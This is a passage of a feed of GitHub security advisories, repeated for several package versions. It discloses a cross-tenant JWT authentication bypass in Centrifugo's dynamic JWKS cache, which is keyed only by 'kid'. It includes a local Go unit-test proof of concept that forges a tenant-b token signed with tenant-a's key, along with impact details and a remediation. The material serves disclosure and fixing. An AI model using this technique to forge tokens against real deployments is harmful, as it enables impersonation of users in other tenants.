+<p>The problem is that the JWKS cache lookup ignores the endpoint/trust domain selected by those token variables. <code>internal/jwtverify/token_verifier_jwt.go:242-245</code> passes only the JWT header <code>kid</code> plus token-derived variables to the JWKS manager:</p>
+<pre><code class="language-go">func (j *jwksManager) verify(token *jwt.Token, tokenVars map[string]any) error {
+    kid := token.Header().KeyID
+
+    key, err := j.Manager.FetchKey(context.Background(), kid, tokenVars)
+</code></pre>
+<p><code>internal/jwks/manager.go:96-117</code> checks cache and <code>singleflight</code> using only <code>kid</code>:</p>
+<pre><code class="language-go">func (m *Manager) FetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
+    if kid == "" {
+        return nil, ErrKeyIDNotProvided
+    }
+
+    if m.useCache {
+        key, err := m.cache.Get(kid)
+        if err == nil {
+            return key, nil
+        }
+    }
+
+    v, err, _ := m.group.Do(kid, func() (any, error) {
+        return m.fetchKey(ctx, kid, tokenVars)
+    })
+</code></pre>
+<p>The resolved JWKS URL is computed only later in <code>internal/jwks/manager.go:133-149</code>:</p>
+<pre><code class="language-go">func (m *Manager) fetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
+    jwkURL := m.url.ExecuteString(tokenVars)
+    ...
+    req, err := http.NewRequestWithContext(ctx, http.MethodGet, jwkURL, nil)
+</code></pre>
+<p>The TTL cache also stores and retrieves keys only by <code>kid</code> at <code>internal/jwks/cache_ttl.go:82-101</code>:</p>
+<pre><code class="language-go">func (tc *TTLCache) Add(key *JWK) error {
+    ...
+    tc.items[key.Kid] = item
+}
+
+func (tc *TTLCache) Get(kid string) (*JWK, error) {
+    ...
+    item, ok := tc.items[kid]
+</code></pre>
+<p>As a result, a key fetched from tenant A's JWKS endpoint can be reused to verify a token claiming tenant B before tenant B's JWKS endpoint is consulted.</p>
+<p>I also reviewed the template safety mitigation in <code>internal/jwtverify/validate.go:99-154</code>. It restricts placeholder regex groups to finite literal alternatives, which helps prevent arbitrary endpoint substitution, but it does not scope cached keys by the resolved endpoint or issuer/audience namespace. The PoC uses a validator-accepted issuer regex: <code>^(?P&lt;tenant&gt;tenant-a|tenant-b)$</code>.</p>
+<h4 id="poc">PoC</h4>
+<p>This is a safe local-only unit test using <code>httptest.Server</code> and generated RSA key pairs. It does not contact external systems.</p>
+<p>From a clean checkout of <code>centrifugal/centrifugo</code> at commit <code>458ee0500f046877d7e8375e32f5e842bc95535b</code>, add this file as <code>internal/jwtverify/jwks_cache_poc_test.go</code>:</p>
+<pre><code class="language-go">package jwtverify
+
+import (
+    "crypto/rsa"
+    "encoding/json"
+    "net/http"
+    "net/http/httptest"
+    "sync/atomic"
+    "testing"
+    "time"
+
+    "github.com/centrifugal/centrifugo/v6/internal/config"
+
+    "github.com/cristalhq/jwt/v5"
+    "github.com/stretchr/testify/require"
+)
+
+func writeRSAJWKS(t *testing.T, w http.ResponseWriter, pubKey *rsa.PublicKey, kid string) {
+    t.Helper()
+    resp := map[string]any{
+        "keys": []map[string]string{
+            {
+                "alg": "RS256",
+                "kty": "RSA",
+                "use": "sig",
+                "kid": kid,
+                "n":   encodeToString(pubKey.N.Bytes()),
+                "e":   encodeUint64ToString(uint64(pubKey.E)),
+            },
+        },
+    }
+    w.Header().Set("Content-Type", "application/json")
+    require.NoError(t, json.NewEncoder(w).Encode(resp))
+}
+
+func getRSAIssuerConnToken(t *testing.T, user string, issuer string, rsaPrivateKey *rsa.PrivateKey, kid string) string {
+    t.Helper()
+    signer, err := jwt.NewSignerRS(jwt.RS256, rsaPrivateKey)
+    require.NoError(t, err)
+    builder := jwt.NewBuilder(signer, jwt.WithKeyID(kid))
+    claims := &amp;ConnectTokenClaims{
+        Base64Info: "e30=",
+        RegisteredClaims: jwt.RegisteredClaims{
+            Subject:   user,
+            Issuer:    issuer,
+            ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),
+        },
+    }
+    token, err := builder.Build(claims)
+    require.NoError(t, err)
+    return token.String()
+}
+
+func TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC(t *testing.T) {
+    const kid = "shared-kid"
+
+    tenantAPrivateKey, tenantAPublicKey := generateTestRSAKeys(t)
+    tenantBPrivateKey, tenantBPublicKey := generateTestRSAKeys(t)
+
+    var tenantARequests int32
+    var tenantBRequests int32
+
+    ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        switch r.URL.Path {
+        case "/tenant-a/jwks.json":
+            atomic.AddInt32(&amp;tenantARequests, 1)
+            writeRSAJWKS(t, w, tenantAPublicKey, kid)
+        case "/tenant-b/jwks.json":
+            atomic.AddInt32(&amp;tenantBRequests, 1)
+            writeRSAJWKS(t, w, tenantBPublicKey, kid)
+        default:
+            http.NotFound(w, r)
+        }
+    }))
+    defer ts.Close()
+
+    cfg := config.DefaultConfig()
+    cfgContainer, err := config.NewContainer(cfg)
+    require.NoError(t, err)
+
+    newVerifier := func() *VerifierJWT {
+        verifier, err := NewTokenVerifierJWT(VerifierConfig{
+            JWKSPublicEndpoint: ts.URL + "/{{tenant}}/jwks.json",
+            IssuerRegex:        `^(?P&lt;tenant&gt;tenant-a|tenant-b)$`,
+        }, cfgContainer)
+        require.NoError(t, err)
+        return verifier
+    }
+
+    legitimateTenantAToken := getRSAIssuerConnToken(t, "tenant-a-user", "tenant-a", tenantAPrivateKey, kid)
+    legitimateTenantBToken := getRSAIssuerConnToken(t, "tenant-b-user", "tenant-b", tenantBPrivateKey, kid)
+    forgedTenantBToken := getRSAIssuerConnToken(t, "victim", "tenant-b", tenantAPrivateKey, kid)
+
+    ct, err := newVerifier().VerifyConnectToken(legitimateTenantBToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "tenant-b-user", ct.UserID)
+
+    _, err = newVerifier().VerifyConnectToken(forgedTenantBToken, false)
+    require.Error(t, err)
+
+    verifier := newVerifier()
+    ct, err = verifier.VerifyConnectToken(legitimateTenantAToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "tenant-a-user", ct.UserID)
+
+    tenantBRequestsBeforeForge := atomic.LoadInt32(&amp;tenantBRequests)
+    ct, err = verifier.VerifyConnectToken(forgedTenantBToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "victim", ct.UserID)
+    require.Equal(t, tenantBRequestsBeforeForge, atomic.LoadInt32(&amp;tenantBRequests))
+}
+</code></pre>
+<p>Run the focused test with the project-supported Go toolchain:</p>
+<pre><code class="language-bash">go test ./internal/jwtverify -run TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC -count=1 -v
+</code></pre>
+<p>Observed vulnerable output in my local test environment using Go 1.26.3:</p>
+<pre><code class="language-text">=== RUN   TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+--- PASS: TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC (0.07s)
+PASS
+ok  	github.com/centrifugal/centrifugo/v6/internal/jwtverify	0.088s
+</code></pre>
+<p>The passing test demonstrates the vulnerable behavior because it asserts these controls:</p>
+<ol>
+<li>A legitimate tenant-B token signed by tenant B succeeds with a fresh verifier.</li>
+<li>A forged tenant-B token signed by tenant A fails with a fresh verifier.</li>
+<li>A legitimate tenant-A token succeeds and primes the JWKS cache with tenant A's <code>shared-kid</code> key.</li>
+<li>The forged tenant-B token signed by tenant A then succeeds with user ID <code>victim</code>.</li>
+<li>The tenant-B JWKS request counter does not increase during forged verification, proving the forged token was accepted from the cross-tenant cache hit rather than from tenant B's JWKS endpoint.</li>
+</ol>
+<p>Expected behavior after a fix: the forged tenant-B token should remain rejected after tenant A primes the cache, or the verifier should fetch/consult tenant B's independent JWKS cache namespace before verification.</p>
+<h4 id="impact">Impact</h4>
+<p>This is a cross-issuer / cross-tenant JWT authentication bypass in dynamic JWKS deployments.</p>
+<p>Impacted deployments are those that use dynamic JWKS endpoint templates to select different JWKS URLs for different allowed issuers or audiences, for example multi-tenant deployments using <code>{{tenant}}</code> values extracted from <code>iss</code> or <code>aud</code>.</p>
+<p>An attacker who can obtain or mint a valid token for one allowed issuer/tenant can authenticate as another allowed issuer/tenant if both JWKS documents use the same <code>kid</code> value and the attacker's issuer key is cached first. <code>kid</code> values are not globally unique by specification and are often operational labels such as <code>current</code>, <code>default</code>, or rotation identifiers, so the verifier should not rely on <code>kid</code> uniqueness across different JWKS trust domains.</p>
+<p>Potential consequences include:</p>
+<ul>
+<li>Authentication as a user in another issuer/tenant namespace.</li>
+<li>Unauthorized connection-token acceptance.</li>
+<li>Unauthorized subscription-token acceptance where separate subscription JWTs are configured.</li>
+<li>Cross-tenant confidentiality and integrity impact when issuer-derived JWKS endpoints are used as separate trust domains.</li>
+</ul>
+<h4 id="suggested-remediation">Suggested remediation</h4>
+<p>Scope JWKS cache entries and <code>singleflight</code> keys to the resolved JWKS trust domain, not only to the JWT <code>kid</code>.</p>
+<p>For dynamic endpoints, compute the endpoint namespace before cache lookup and use a composite cache key such as:</p>
+<pre><code class="language-text">resolved_jwks_url + "\x00" + kid
+</code></pre>
+<p>or an equivalent canonical trust-domain identifier plus <code>kid</code>.</p>
+<p>The same composite namespace should be used for:</p>
+<ul>
+<li>TTL cache lookup.</li>
+<li>TTL cache storage.</li>
+<li><code>singleflight.Group.Do</code> keys.</li>
+</ul>
+<p>A regression test should prime tenant A's cache and then verify that a forged tenant-B token signed by tenant A remains rejected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj">https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj</a></li>
+<li><a href="https://github.com/advisories/GHSA-g6vg-wj8f-48cj">https://github.com/advisories/GHSA-g6vg-wj8f-48cj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g6vg-wj8f-48cj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T20:28:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/centrifugal/centrifugo/v5] Centrifugo's dynamic JWKS key cache keyed only by `kid` allows cross-issuer JWT authentication bypass]]></title>
+        <id>https://github.com/advisories/GHSA-g6vg-wj8f-48cj</id>
+        <link href="https://github.com/advisories/GHSA-g6vg-wj8f-48cj"/>
+        <updated>2026-07-01T20:28:55.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
+<p>Centrifugo's dynamic JWKS endpoint feature can verify a JWT for one allowed issuer using a public key cached from another allowed issuer. The JWKS cache and <code>singleflight</code> lookup are keyed only by the JWT header <code>kid</code>, not by the resolved JWKS endpoint, issuer, audience, or other trust-domain namespace.</p>
+<p>In a documented multi-issuer dynamic JWKS configuration, an attacker who can obtain or mint a valid token for issuer/tenant A can authenticate as issuer/tenant B if both JWKS documents use the same <code>kid</code> value and tenant A's key is cached first. This affects connection token verification and subscription token verification because both paths use the same JWKS verification manager.</p>
+<h4 id="details">Details</h4>
+<p>The vulnerable path is reachable when either of these shipped configuration options is set to a templated JWKS URL using values derived from JWT <code>iss</code> or <code>aud</code> claims:</p>
+<ul>
+<li><code>client.token.jwks_public_endpoint</code></li>
+<li><code>client.subscription_token.jwks_public_endpoint</code></li>
+</ul>
+<p>Relevant shipped config fields are defined in <code>internal/configtypes/types.go:59-65</code>, mapped into verifier configuration in <code>internal/confighelpers/jwt.go:36-41</code>, and exposed in the generated config schema at <code>internal/cli/configdoc/schema.json:3927</code>, <code>3947</code>, <code>3967</code>, <code>3987</code>, <code>4069</code>, <code>4089</code>, <code>4109</code>, and <code>4129</code>. Dynamic JWKS endpoints based on <code>iss</code> and <code>aud</code> are documented in the project changelog at <code>CHANGELOG.md:107</code>.</p>
+<p>External clients control JWT connection and subscription tokens:</p>
+<ul>
+<li>Connection tokens reach <code>VerifyConnectToken</code> from <code>internal/client/handler.go:350-352</code>.</li>
+<li>Normal subscription tokens reach <code>VerifySubscribeToken</code> from <code>internal/client/handler.go:769-775</code>.</li>
+<li>Subscription refresh tokens reach <code>VerifySubscribeToken</code> from <code>internal/client/handler.go:628-632</code>.</li>
+</ul>
+<p>The verifier must parse token claims before signature verification to resolve the dynamic JWKS endpoint:</p>
+<ul>
+<li><code>VerifyConnectToken</code> parses without verification at <code>internal/jwtverify/token_verifier_jwt.go:528-535</code>, extracts template variables before signature verification at <code>internal/jwtverify/token_verifier_jwt.go:539-548</code>, then validates claims only after signature verification at <code>internal/jwtverify/token_verifier_jwt.go:557-560</code>.</li>
+<li><code>VerifySubscribeToken</code> follows the same pattern at <code>internal/jwtverify/token_verifier_jwt.go:700-732</code>.</li>
+</ul>
+<p>The problem is that the JWKS cache lookup ignores the endpoint/trust domain selected by those token variables. <code>internal/jwtverify/token_verifier_jwt.go:242-245</code> passes only the JWT header <code>kid</code> plus token-derived variables to the JWKS manager:</p>
+<pre><code class="language-go">func (j *jwksManager) verify(token *jwt.Token, tokenVars map[string]any) error {
+    kid := token.Header().KeyID
+
+    key, err := j.Manager.FetchKey(context.Background(), kid, tokenVars)
+</code></pre>
+<p><code>internal/jwks/manager.go:96-117</code> checks cache and <code>singleflight</code> using only <code>kid</code>:</p>
+<pre><code class="language-go">func (m *Manager) FetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
+    if kid == "" {
+        return nil, ErrKeyIDNotProvided
+    }
+
+    if m.useCache {
+        key, err := m.cache.Get(kid)
+        if err == nil {
+            return key, nil
+        }
+    }
+
+    v, err, _ := m.group.Do(kid, func() (any, error) {
+        return m.fetchKey(ctx, kid, tokenVars)
+    })
+</code></pre>
+<p>The resolved JWKS URL is computed only later in <code>internal/jwks/manager.go:133-149</code>:</p>
+<pre><code class="language-go">func (m *Manager) fetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
+    jwkURL := m.url.ExecuteString(tokenVars)
+    ...
+    req, err := http.NewRequestWithContext(ctx, http.MethodGet, jwkURL, nil)
+</code></pre>
+<p>The TTL cache also stores and retrieves keys only by <code>kid</code> at <code>internal/jwks/cache_ttl.go:82-101</code>:</p>
+<pre><code class="language-go">func (tc *TTLCache) Add(key *JWK) error {
+    ...
+    tc.items[key.Kid] = item
+}
+
+func (tc *TTLCache) Get(kid string) (*JWK, error) {
+    ...
+    item, ok := tc.items[kid]
+</code></pre>
+<p>As a result, a key fetched from tenant A's JWKS endpoint can be reused to verify a token claiming tenant B before tenant B's JWKS endpoint is consulted.</p>
+<p>I also reviewed the template safety mitigation in <code>internal/jwtverify/validate.go:99-154</code>. It restricts placeholder regex groups to finite literal alternatives, which helps prevent arbitrary endpoint substitution, but it does not scope cached keys by the resolved endpoint or issuer/audience namespace. The PoC uses a validator-accepted issuer regex: <code>^(?P&lt;tenant&gt;tenant-a|tenant-b)$</code>.</p>
+<h4 id="poc">PoC</h4>
+<p>This is a safe local-only unit test using <code>httptest.Server</code> and generated RSA key pairs. It does not contact external systems.</p>
+<p>From a clean checkout of <code>centrifugal/centrifugo</code> at commit <code>458ee0500f046877d7e8375e32f5e842bc95535b</code>, add this file as <code>internal/jwtverify/jwks_cache_poc_test.go</code>:</p>
+<pre><code class="language-go">package jwtverify
+
+import (
+    "crypto/rsa"
+    "encoding/json"
+    "net/http"
+    "net/http/httptest"
+    "sync/atomic"
+    "testing"
+    "time"
+
+    "github.com/centrifugal/centrifugo/v6/internal/config"
+
+    "github.com/cristalhq/jwt/v5"
+    "github.com/stretchr/testify/require"
+)
+
+func writeRSAJWKS(t *testing.T, w http.ResponseWriter, pubKey *rsa.PublicKey, kid string) {
+    t.Helper()
+    resp := map[string]any{
+        "keys": []map[string]string{
+            {
+                "alg": "RS256",
+                "kty": "RSA",
+                "use": "sig",
+                "kid": kid,
+                "n":   encodeToString(pubKey.N.Bytes()),
+                "e":   encodeUint64ToString(uint64(pubKey.E)),
+            },
+        },
+    }
+    w.Header().Set("Content-Type", "application/json")
+    require.NoError(t, json.NewEncoder(w).Encode(resp))
+}
+
+func getRSAIssuerConnToken(t *testing.T, user string, issuer string, rsaPrivateKey *rsa.PrivateKey, kid string) string {
+    t.Helper()
+    signer, err := jwt.NewSignerRS(jwt.RS256, rsaPrivateKey)
+    require.NoError(t, err)
+    builder := jwt.NewBuilder(signer, jwt.WithKeyID(kid))
+    claims := &amp;ConnectTokenClaims{
+        Base64Info: "e30=",
+        RegisteredClaims: jwt.RegisteredClaims{
+            Subject:   user,
+            Issuer:    issuer,
+            ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),
+        },
+    }
+    token, err := builder.Build(claims)
+    require.NoError(t, err)
+    return token.String()
+}
+
+func TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC(t *testing.T) {
+    const kid = "shared-kid"
+
+    tenantAPrivateKey, tenantAPublicKey := generateTestRSAKeys(t)
+    tenantBPrivateKey, tenantBPublicKey := generateTestRSAKeys(t)
+
+    var tenantARequests int32
+    var tenantBRequests int32
+
+    ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        switch r.URL.Path {
+        case "/tenant-a/jwks.json":
+            atomic.AddInt32(&amp;tenantARequests, 1)
+            writeRSAJWKS(t, w, tenantAPublicKey, kid)
+        case "/tenant-b/jwks.json":
+            atomic.AddInt32(&amp;tenantBRequests, 1)
+            writeRSAJWKS(t, w, tenantBPublicKey, kid)
+        default:
+            http.NotFound(w, r)
+        }
+    }))
+    defer ts.Close()
+
+    cfg := config.DefaultConfig()
+    cfgContainer, err := config.NewContainer(cfg)
+    require.NoError(t, err)
+
+    newVerifier := func() *VerifierJWT {
+        verifier, err := NewTokenVerifierJWT(VerifierConfig{
+            JWKSPublicEndpoint: ts.URL + "/{{tenant}}/jwks.json",
+            IssuerRegex:        `^(?P&lt;tenant&gt;tenant-a|tenant-b)$`,
+        }, cfgContainer)
+        require.NoError(t, err)
+        return verifier
+    }
+
+    legitimateTenantAToken := getRSAIssuerConnToken(t, "tenant-a-user", "tenant-a", tenantAPrivateKey, kid)
+    legitimateTenantBToken := getRSAIssuerConnToken(t, "tenant-b-user", "tenant-b", tenantBPrivateKey, kid)
+    forgedTenantBToken := getRSAIssuerConnToken(t, "victim", "tenant-b", tenantAPrivateKey, kid)
+
+    ct, err := newVerifier().VerifyConnectToken(legitimateTenantBToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "tenant-b-user", ct.UserID)
+
+    _, err = newVerifier().VerifyConnectToken(forgedTenantBToken, false)
+    require.Error(t, err)
+
+    verifier := newVerifier()
+    ct, err = verifier.VerifyConnectToken(legitimateTenantAToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "tenant-a-user", ct.UserID)
+
+    tenantBRequestsBeforeForge := atomic.LoadInt32(&amp;tenantBRequests)
+    ct, err = verifier.VerifyConnectToken(forgedTenantBToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "victim", ct.UserID)
+    require.Equal(t, tenantBRequestsBeforeForge, atomic.LoadInt32(&amp;tenantBRequests))
+}
+</code></pre>
+<p>Run the focused test with the project-supported Go toolchain:</p>
+<pre><code class="language-bash">go test ./internal/jwtverify -run TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC -count=1 -v
+</code></pre>
+<p>Observed vulnerable output in my local test environment using Go 1.26.3:</p>
+<pre><code class="language-text">=== RUN   TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+--- PASS: TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC (0.07s)
+PASS
+ok  	github.com/centrifugal/centrifugo/v6/internal/jwtverify	0.088s
+</code></pre>
+<p>The passing test demonstrates the vulnerable behavior because it asserts these controls:</p>
+<ol>
+<li>A legitimate tenant-B token signed by tenant B succeeds with a fresh verifier.</li>
+<li>A forged tenant-B token signed by tenant A fails with a fresh verifier.</li>
+<li>A legitimate tenant-A token succeeds and primes the JWKS cache with tenant A's <code>shared-kid</code> key.</li>
+<li>The forged tenant-B token signed by tenant A then succeeds with user ID <code>victim</code>.</li>
+<li>The tenant-B JWKS request counter does not increase during forged verification, proving the forged token was accepted from the cross-tenant cache hit rather than from tenant B's JWKS endpoint.</li>
+</ol>
+<p>Expected behavior after a fix: the forged tenant-B token should remain rejected after tenant A primes the cache, or the verifier should fetch/consult tenant B's independent JWKS cache namespace before verification.</p>
+<h4 id="impact">Impact</h4>
+<p>This is a cross-issuer / cross-tenant JWT authentication bypass in dynamic JWKS deployments.</p>
+<p>Impacted deployments are those that use dynamic JWKS endpoint templates to select different JWKS URLs for different allowed issuers or audiences, for example multi-tenant deployments using <code>{{tenant}}</code> values extracted from <code>iss</code> or <code>aud</code>.</p>
+<p>An attacker who can obtain or mint a valid token for one allowed issuer/tenant can authenticate as another allowed issuer/tenant if both JWKS documents use the same <code>kid</code> value and the attacker's issuer key is cached first. <code>kid</code> values are not globally unique by specification and are often operational labels such as <code>current</code>, <code>default</code>, or rotation identifiers, so the verifier should not rely on <code>kid</code> uniqueness across different JWKS trust domains.</p>
+<p>Potential consequences include:</p>
+<ul>
+<li>Authentication as a user in another issuer/tenant namespace.</li>
+<li>Unauthorized connection-token acceptance.</li>
+<li>Unauthorized subscription-token acceptance where separate subscription JWTs are configured.</li>
+<li>Cross-tenant confidentiality and integrity impact when issuer-derived JWKS endpoints are used as separate trust domains.</li>
+</ul>
+<h4 id="suggested-remediation">Suggested remediation</h4>
+<p>Scope JWKS cache entries and <code>singleflight</code> keys to the resolved JWKS trust domain, not only to the JWT <code>kid</code>.</p>
+<p>For dynamic endpoints, compute the endpoint namespace before cache lookup and use a composite cache key such as:</p>
+<pre><code class="language-text">resolved_jwks_url + "\x00" + kid
+</code></pre>
+<p>or an equivalent canonical trust-domain identifier plus <code>kid</code>.</p>
+<p>The same composite namespace should be used for:</p>
+<ul>
+<li>TTL cache lookup.</li>
+<li>TTL cache storage.</li>
+<li><code>singleflight.Group.Do</code> keys.</li>
+</ul>
+<p>A regression test should prime tenant A's cache and then verify that a forged tenant-B token signed by tenant A remains rejected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj">https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj</a></li>
+<li><a href="https://github.com/advisories/GHSA-g6vg-wj8f-48cj">https://github.com/advisories/GHSA-g6vg-wj8f-48cj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g6vg-wj8f-48cj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T20:28:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/centrifugal/centrifugo/v6] Centrifugo's dynamic JWKS key cache keyed only by `kid` allows cross-issuer JWT authentication bypass]]></title>
+        <id>https://github.com/advisories/GHSA-g6vg-wj8f-48cj</id>
+        <link href="https://github.com/advisories/GHSA-g6vg-wj8f-48cj"/>
+        <updated>2026-07-01T20:28:55.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
+<p>Centrifugo's dynamic JWKS endpoint feature can verify a JWT for one allowed issuer using a public key cached from another allowed issuer. The JWKS cache and <code>singleflight</code> lookup are keyed only by the JWT header <code>kid</code>, not by the resolved JWKS endpoint, issuer, audience, or other trust-domain namespace.</p>
+<p>In a documented multi-issuer dynamic JWKS configuration, an attacker who can obtain or mint a valid token for issuer/tenant A can authenticate as issuer/tenant B if both JWKS documents use the same <code>kid</code> value and tenant A's key is cached first. This affects connection token verification and subscription token verification because both paths use the same JWKS verification manager.</p>
+<h4 id="details">Details</h4>
+<p>The vulnerable path is reachable when either of these shipped configuration options is set to a templated JWKS URL using values derived from JWT <code>iss</code> or <code>aud</code> claims:</p>
+<ul>
+<li><code>client.token.jwks_public_endpoint</code></li>
+<li><code>client.subscription_token.jwks_public_endpoint</code></li>
+</ul>
+<p>Relevant shipped config fields are defined in <code>internal/configtypes/types.go:59-65</code>, mapped into verifier configuration in <code>internal/confighelpers/jwt.go:36-41</code>, and exposed in the generated config schema at <code>internal/cli/configdoc/schema.json:3927</code>, <code>3947</code>, <code>3967</code>, <code>3987</code>, <code>4069</code>, <code>4089</code>, <code>4109</code>, and <code>4129</code>. Dynamic JWKS endpoints based on <code>iss</code> and <code>aud</code> are documented in the project changelog at <code>CHANGELOG.md:107</code>.</p>
+<p>External clients control JWT connection and subscription tokens:</p>
+<ul>
+<li>Connection tokens reach <code>VerifyConnectToken</code> from <code>internal/client/handler.go:350-352</code>.</li>
+<li>Normal subscription tokens reach <code>VerifySubscribeToken</code> from <code>internal/client/handler.go:769-775</code>.</li>
+<li>Subscription refresh tokens reach <code>VerifySubscribeToken</code> from <code>internal/client/handler.go:628-632</code>.</li>
+</ul>
+<p>The verifier must parse token claims before signature verification to resolve the dynamic JWKS endpoint:</p>
+<ul>
+<li><code>VerifyConnectToken</code> parses without verification at <code>internal/jwtverify/token_verifier_jwt.go:528-535</code>, extracts template variables before signature verification at <code>internal/jwtverify/token_verifier_jwt.go:539-548</code>, then validates claims only after signature verification at <code>internal/jwtverify/token_verifier_jwt.go:557-560</code>.</li>
+<li><code>VerifySubscribeToken</code> follows the same pattern at <code>internal/jwtverify/token_verifier_jwt.go:700-732</code>.</li>
+</ul>
+<p>The problem is that the JWKS cache lookup ignores the endpoint/trust domain selected by those token variables. <code>internal/jwtverify/token_verifier_jwt.go:242-245</code> passes only the JWT header <code>kid</code> plus token-derived variables to the JWKS manager:</p>
+<pre><code class="language-go">func (j *jwksManager) verify(token *jwt.Token, tokenVars map[string]any) error {
+    kid := token.Header().KeyID
+
+    key, err := j.Manager.FetchKey(context.Background(), kid, tokenVars)
+</code></pre>
+<p><code>internal/jwks/manager.go:96-117</code> checks cache and <code>singleflight</code> using only <code>kid</code>:</p>
+<pre><code class="language-go">func (m *Manager) FetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
+    if kid == "" {
+        return nil, ErrKeyIDNotProvided
+    }
+
+    if m.useCache {
+        key, err := m.cache.Get(kid)
+        if err == nil {
+            return key, nil
+        }
+    }
+
+    v, err, _ := m.group.Do(kid, func() (any, error) {
+        return m.fetchKey(ctx, kid, tokenVars)
+    })
+</code></pre>
+<p>The resolved JWKS URL is computed only later in <code>internal/jwks/manager.go:133-149</code>:</p>
+<pre><code class="language-go">func (m *Manager) fetchKey(ctx context.Context, kid string, tokenVars map[string]any) (*JWK, error) {
+    jwkURL := m.url.ExecuteString(tokenVars)
+    ...
+    req, err := http.NewRequestWithContext(ctx, http.MethodGet, jwkURL, nil)
+</code></pre>
+<p>The TTL cache also stores and retrieves keys only by <code>kid</code> at <code>internal/jwks/cache_ttl.go:82-101</code>:</p>
+<pre><code class="language-go">func (tc *TTLCache) Add(key *JWK) error {
+    ...
+    tc.items[key.Kid] = item
+}
+
+func (tc *TTLCache) Get(kid string) (*JWK, error) {
+    ...
+    item, ok := tc.items[kid]
+</code></pre>
+<p>As a result, a key fetched from tenant A's JWKS endpoint can be reused to verify a token claiming tenant B before tenant B's JWKS endpoint is consulted.</p>
+<p>I also reviewed the template safety mitigation in <code>internal/jwtverify/validate.go:99-154</code>. It restricts placeholder regex groups to finite literal alternatives, which helps prevent arbitrary endpoint substitution, but it does not scope cached keys by the resolved endpoint or issuer/audience namespace. The PoC uses a validator-accepted issuer regex: <code>^(?P&lt;tenant&gt;tenant-a|tenant-b)$</code>.</p>
+<h4 id="poc">PoC</h4>
+<p>This is a safe local-only unit test using <code>httptest.Server</code> and generated RSA key pairs. It does not contact external systems.</p>
+<p>From a clean checkout of <code>centrifugal/centrifugo</code> at commit <code>458ee0500f046877d7e8375e32f5e842bc95535b</code>, add this file as <code>internal/jwtverify/jwks_cache_poc_test.go</code>:</p>
+<pre><code class="language-go">package jwtverify
+
+import (
+    "crypto/rsa"
+    "encoding/json"
+    "net/http"
+    "net/http/httptest"
+    "sync/atomic"
+    "testing"
+    "time"
+
+    "github.com/centrifugal/centrifugo/v6/internal/config"
+
+    "github.com/cristalhq/jwt/v5"
+    "github.com/stretchr/testify/require"
+)
+
+func writeRSAJWKS(t *testing.T, w http.ResponseWriter, pubKey *rsa.PublicKey, kid string) {
+    t.Helper()
+    resp := map[string]any{
+        "keys": []map[string]string{
+            {
+                "alg": "RS256",
+                "kty": "RSA",
+                "use": "sig",
+                "kid": kid,
+                "n":   encodeToString(pubKey.N.Bytes()),
+                "e":   encodeUint64ToString(uint64(pubKey.E)),
+            },
+        },
+    }
+    w.Header().Set("Content-Type", "application/json")
+    require.NoError(t, json.NewEncoder(w).Encode(resp))
+}
+
